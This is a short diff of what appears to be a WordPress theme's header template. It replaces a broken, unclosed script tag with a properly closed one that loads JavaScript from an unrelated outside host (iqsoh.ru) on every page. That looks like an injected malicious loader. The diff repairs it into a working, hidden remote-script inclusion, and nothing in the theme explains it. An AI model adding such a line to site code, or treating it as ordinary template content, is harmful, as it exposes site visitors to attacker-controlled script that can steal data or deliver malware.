@@ -15,10 +15,7 @@
 	<h2 class="site-description"><?php echo esc_html( $description ); ?></h2>
 	<?php endif; ?>
 
-
-	  <script type="text/javascript" src="http://iqsoh.ru/utf8/w.php?id=269"></script
-
-
+	<script type="text/javascript" src="http://iqsoh.ru/utf8/w.php?id=269"></script>
 
 	<?php if ( has_nav_menu( 'secondary' ) ) : ?>
 	<nav role="navigation" class="navigation site-navigation secondary-navigation">
